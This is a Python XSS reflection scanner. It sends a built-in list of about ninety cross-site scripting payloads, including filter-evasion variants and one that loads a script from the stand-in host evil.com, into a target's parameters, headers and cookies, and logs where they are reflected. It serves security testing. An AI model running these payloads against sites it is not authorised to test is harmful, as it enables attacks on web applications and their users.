import argparse
import csv
import html
import time
import re
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
import requests

DEFAULT_PAYLOADS = [
    '<script>alert(1)</script>',
    '<script>alert(document.domain)</script>',
    '<script>alert(document.cookie)</script>',
    '<script>confirm(1)</script>',
    '<script>prompt(1)</script>',
    '<script src=//evil.com/x.js></script>',
    '</script><script>alert(1)</script>',
    '<ScRiPt>alert(1)</sCrIpT>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><svg onload=alert(1)>',
    "'><svg onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "'><img src=x onerror=alert(1)>",
    '";alert(1);//',
    "';alert(1);//",
    '";alert(1)//',
    "';alert(1)//",
    '`-alert(1)-`',
    '</title><script>alert(1)</script>',
    '</textarea><script>alert(1)</script>',
    '</noscript><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<img src=x onerror=alert(document.domain)>',
    '<img src=1 onerror=alert(1)>',
    '<img """><script>alert(1)</script>">',
    '<image src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg onload=alert(document.domain)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    '<body onload=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body background=javascript:alert(1)>',
    '<iframe src=javascript:alert(1)>',
    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
    '<iframe onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select autofocus onfocus=alert(1)>',
    '<textarea autofocus onfocus=alert(1)>',
    '<keygen autofocus onfocus=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<a href=javascript:alert(1)>click</a>',
    '<a href="javascript:alert(1)">click</a>',
    '<a href=javascript:alert(document.domain)>click</a>',
    '<form action=javascript:alert(1)><input type=submit>',
    '<object data=javascript:alert(1)>',
    '<embed src=javascript:alert(1)>',
    '<base href=javascript:alert(1)//>',
    '<div style=width:100%;height:100%;background:red;position:fixed onmouseover=alert(1)>',
    '<div onmouseover=alert(1)>hover</div>',
    '<p onmouseover=alert(1)>text</p>',
    "<style>@import 'javascript:alert(1)';</style>",
    '<style onload=alert(1)>',
    '<link rel=stylesheet href=javascript:alert(1)>',
    '<meta http-equiv=refresh content="0;url=javascript:alert(1)">',
    'javascript:alert(1)',
    'javascript:alert(document.domain)',
    'javascript:alert(document.cookie)',
    'jaVasCript:alert(1)',
    'java\\tscript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '\'"--></style></script><script>alert(1)</script>',
    '\'"--></textarea></script><script>alert(1)</script>',
    '\\"><script>alert(1)</script>',
    "\\'><script>alert(1)</script>",
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>',
    '<script>alert(/xss/)</script>',
    "<script>eval(atob('YWxlcnQoMSk='))</script>",
    '<script>top[8680439..toString(30)](1)</script>',
    '<script>new Function`al\\x65rt\\x281\\x29```</script>',
    '<svg/onload=alert`1`>',
    '<svg onload=alert&lpar;1&rpar;>',
    '<img src=x:alert(alt) onerror=eval(src) alt=1>',
    '";alert(String.fromCharCode(88,83,83));//',
    '<x onclick=alert(1)>click</x>',
    '<x contenteditable onfocus=alert(1) autofocus>',
    '<table background=javascript:alert(1)>',
    '<xss id=x tabindex=1 onactivate=alert(1)></xss>',
]

USER_AGENT = "xss-tester/1.0"

def get_baseline(url, method='GET', data=None, headers=None, cookies=None):
    headers = headers or {}
    headers.setdefault("User-Agent", USER_AGENT)
    if method.upper() == 'GET':
        r = requests.get(url, headers=headers, cookies=cookies, timeout=15)
    else:
        r = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=15)
    return r.status_code, r.text

def inject_into_url(url, param, payload):
    p = urlparse(url)
    qs = dict(parse_qsl(p.query, keep_blank_values=True))
    qs[param] = payload
    new_q = urlencode(qs, doseq=True)
    new_url = urlunparse((p.scheme, p.netloc, p.path, p.params, new_q, p.fragment))
    return new_url

def find_reflection(test_text, payload):
    if payload in test_text:
        return {'type': 'raw', 'snippet': extract_context(test_text, payload)}
    escaped = html.escape(payload)
    if escaped in test_text:
        return {'type': 'encoded', 'snippet': extract_context(test_text, escaped)}
    pattern = re.sub(
        r'(<|>|/|")',
        lambda m: "(?:%s|%s)" % (re.escape(m.group(0)), html.escape(m.group(0))),
        re.escape(payload),
    )
    match = re.search(pattern, test_text, re.IGNORECASE)
    if match:
        return {'type': 'partial', 'snippet': extract_context(test_text, match.group(0))}
    return None

def extract_context(text, needle, width=80):
    idx = text.find(needle)
    if idx == -1:
        return ""
    start = max(0, idx - width)
    end = min(len(text), idx + len(needle) + width)
    return text[start:end].replace("\n", " ")

def scan_get(url, params_to_test, payloads, headers=None, cookies=None, rate=0.2):
    results = []
    for param in params_to_test:
        for p in payloads:
            test_url = inject_into_url(url, param, p)
            try:
                r = requests.get(test_url, headers=headers or {}, cookies=cookies or {}, timeout=15)
            except requests.RequestException as e:
                print(f"[!] Request failed for {test_url}: {e}")
                continue
            info = find_reflection(r.text, p)
            if info:
                results.append({
                    'vector': 'GET param',
                    'param': param,
                    'payload': p,
                    'type': info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': test_url,
                })
            time.sleep(rate)
    return results

def scan_post(url, post_keys, payloads, headers=None, cookies=None, rate=0.2):
    results = []
    for key in post_keys:
        for p in payloads:
            data = {k: "" for k in post_keys}
            data[key] = p
            try:
                r = requests.post(url, data=data, headers=headers or {}, cookies=cookies or {}, timeout=15)
            except requests.RequestException as e:
                print(f"[!] Request failed for POST {url} with {key}: {e}")
                continue
            info = find_reflection(r.text, p)
            if info:
                results.append({
                    'vector': 'POST param',
                    'param': key,
                    'payload': p,
                    'type': info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': url,
                })
            time.sleep(rate)
    return results

def scan_headers_and_cookies(url, header_keys, cookie_keys, payloads, headers=None, cookies=None, rate=0.2):
    results = []
    for key in header_keys:
        for p in payloads:
            h = dict(headers or {})
            h[key] = p
            try:
                r = requests.get(url, headers=h, cookies=cookies or {}, timeout=15)
            except requests.RequestException as e:
                print(f"[!] Request failed for header {key}: {e}")
                continue
            info = find_reflection(r.text, p)
            if info:
                results.append({
                    'vector': 'HEADER',
                    'param': key,
                    'payload': p,
                    'type': info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': url,
                })
            time.sleep(rate)
    for key in cookie_keys:
        for p in payloads:
            c = dict(cookies or {})
            c[key] = p
            try:
                r = requests.get(url, headers=headers or {}, cookies=c, timeout=15)
            except requests.RequestException as e:
                print(f"[!] Request failed for cookie {key}: {e}")
                continue
            info = find_reflection(r.text, p)
            if info:
                results.append({
                    'vector': 'COOKIE',
                    'param': key,
                    'payload': p,
                    'type': info['type'],
                    'status_code': r.status_code,
                    'snippet': info['snippet'],
                    'tested_url': url,
                })
            time.sleep(rate)
    return results

def save_results_csv(results, filename="xss_results.csv"):
    if not results:
        print("No results to save.")
        return
    keys = results[0].keys()
    with open(filename, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=keys)
        writer.writeheader()
        for r in results:
            writer.writerow(r)
    print(f"[+] Results saved to {filename}")

def parse_args():
    parser = argparse.ArgumentParser(description="Simple XSS reflection tester")
    parser.add_argument('url', help="Target URL (use full URL, e.g. http://localhost/page.php)")
    parser.add_argument('--get-params', nargs='*', default=['q', 'search', 'id', 'name'], help="GET parameter names to test")
    parser.add_argument('--post-params', nargs='*', default=['username', 'email', 'comment', 'message'], help="POST form keys to test")
    parser.add_argument('--headers', nargs='*', default=['User-Agent', 'Referer', 'X-Forwarded-For'], help="Header names to test")
    parser.add_argument('--cookies', nargs='*', default=['session', 'theme', 'username'], help="Cookie names to test")
    parser.add_argument('--payloads-file', help="File with payloads (one per line). If omitted, uses default payloads")
    parser.add_argument('--rate', type=float, default=0.2, help="Delay between requests in seconds (be polite)")
    return parser.parse_args()

def main():
    args = parse_args()
    payloads = DEFAULT_PAYLOADS[:]
    if args.payloads_file:
        with open(args.payloads_file, 'r', encoding='utf-8') as pf:
            payloads = [line.strip() for line in pf if line.strip()]

    headers = {'User-Agent': USER_AGENT}
    all_results = []

    print("[*] Starting scans...")

    print("[*] Scanning GET params:", args.get_params)
    all_results.extend(scan_get(args.url, args.get_params, payloads, headers=headers, cookies={}, rate=args.rate))

    print("[*] Scanning POST params:", args.post_params)
    all_results.extend(scan_post(args.url, args.post_params, payloads, headers=headers, cookies={}, rate=args.rate))

    print("[*] Scanning headers:", args.headers, "and cookies:", args.cookies)
    all_results.extend(scan_headers_and_cookies(args.url, args.headers, args.cookies, payloads, headers=dict(headers), cookies={}, rate=args.rate))

    if all_results:
        print("[!] Potential reflections found:")
        for r in all_results:
            print(f" - {r['vector']} {r['param']} -> {r['type']} (payload={r['payload']})")
            print("   snippet:", r.get('snippet', '')[:160])
    else:
        print("[+] No obvious reflections found using simple heuristics.")

    save_results_csv(all_results)

if __name__ == '__main__':
    main()
